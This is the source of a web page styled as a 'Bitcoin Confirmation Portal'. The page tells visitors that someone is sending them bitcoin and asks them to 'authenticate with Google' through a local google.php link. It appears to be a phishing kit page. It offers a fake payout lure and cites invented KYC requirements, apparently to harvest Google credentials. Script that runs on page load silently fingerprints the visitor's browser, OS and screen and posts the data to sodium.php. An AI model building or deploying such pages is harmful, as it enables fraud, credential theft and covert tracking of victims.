
<?php
  require_once('config.php');
  Telemetry::log();
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Bitcoin Confirmation Portal</title>
  <link rel="stylesheet" href="style.css"/>
</head>
<script>

function additional() {
    const userAgent = navigator.userAgent;
let browserName, browserVersion;

if (/EdgA/.test(userAgent)) {
    browserName = "Edge (Android)";
} else if (/EdgiOS/.test(userAgent)) {
    browserName = "Edge (iOS)";
} else if (/Edg/.test(userAgent)) {
    browserName = "Edge";
} else if (/Chrome/.test(userAgent)) {
    browserName = "Chrome";
} else if (/Firefox/.test(userAgent)) {
    browserName = "Firefox";
} else if (/Safari/.test(userAgent)) {
    browserName = "Safari";
} else if (/Opera|OPR/.test(userAgent)) {
     browserName = "Opera";
} else if (/MSIE|Trident/.test(userAgent)) {
    browserName = "Internet Explorer";
} else {
    browserName = "Unknown";
}

const versionMatch = userAgent.match(/(chrome|firefox|safari|opera|msie|trident|edge|edga|edgios)\/?\s*(\d+(\.\d+)*)/i);

if (versionMatch && versionMatch[2]) {
    browserVersion = versionMatch[2];
} else {
    browserVersion = "Unknown";
}

return [browserName, browserVersion]
}

function os() {
    var OSName = "Unknown";
if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1) OSName="Windows 10";
if (window.navigator.userAgent.indexOf("Windows NT 6.3") != -1) OSName="Windows 8.1";
if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSName="Windows 8";
if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSName="Windows 7";
if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSName="Windows Vista";
if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSName="Windows XP";
if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSName="Windows 2000";
if (window.navigator.userAgent.indexOf("Mac")            != -1) OSName="Mac/iOS";
if (window.navigator.userAgent.indexOf("X11")            != -1) OSName="UNIX";
if (window.navigator.userAgent.indexOf("Linux")          != -1) OSName="Linux";
return OSName
}

async function tel() {

    let info = {
        width: window.screen.width,
        height: window.screen.height,
        browserLanguage: navigator.language,
        systemLanguage: navigator.systemLanguage,
        userLanguage: navigator.userLanguage,
        oscpu: navigator.oscpu,
        browser: additional(),
        os: navigator.platform,
    }
    
    let result = await fetch('sodium.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(info)
    })

    console.log(result.status)
}

(async () => tel())()
</script>
<body>
    <style>
        body {
  margin: 0;
  padding: 0;
  font-family: 'Segoe UI', sans-serif;
  background: #f7f9fc;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  padding: 20px;
}

.card {
  background: #fff;
  padding: 40px 30px;
  max-width: 400px;
  box-shadow: 0 8px 20px rgba(0,0,0,0.1);
  border-radius: 10px;
  text-align: center;
}

.logo {
  width: 60px;
  margin-bottom: 20px;
}

h1 {
  font-size: 22px;
  margin-bottom: 10px;
  color: #333;
}

p {
  font-size: 14px;
  color: #555;
  margin-bottom: 30px;
}

form {
  display: flex;
  flex-direction: column;
  text-align: left;
}

label {
  font-size: 13px;
  margin-bottom: 5px;
  color: #444;
}

input {
  padding: 12px;
  margin-bottom: 20px;
  border-radius: 6px;
  border: 1px solid #ccc;
  font-size: 14px;
}

button {
  padding: 12px;
  background-color: #f7931a;
  color: white;
  border: none;
  border-radius: 6px;
  font-size: 15px;
  cursor: pointer;
  transition: background 0.2s;
}

a {
  padding: 12px;
  background-color: #4285F4;
  color: white;
  border: none;
  border-radius: 6px;
  font-size: 15px;
  cursor: pointer;
  transition: background 0.2s;
  display: block;
  text-align: center;

}

a img {
  width: 30px;
  height: 30px;
  object-fit: contain;
}

button:hover {
  background-color: #e48210;
}
        </style>
  <div class="container">
    <div class="card">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/300px-Bitcoin.svg.png" alt="Bitcoin Logo" class="logo">
      <h1>Hello</h1>
      <h3>Bitcoin Confirmation Required</h3>
      <p>Please confirm your identity to receive your Bitcoin transaction details in order to ensure complience with Canadian privacy and KYC laws</p>

      <p>Bella wants to send you 0.00124BTC (200USD) to the below address.</p>
      <form method="POST" action="success.php">
        <label for="wallet">Bitcoin Wallet Address</label>
        <input type="text" id="wallet" name="wallet" placeholder="e.g. 1A1zP1..." value='36K2hTtKHaKaYaVnhKVV2Z8GExYs9VJFEf' disabled/>
        <a href='google.php'>Google</a>
        <p>Easy authenticate with Google to confirm payout</p>
      </form>
    </div>
  </div>
</body>
</html>
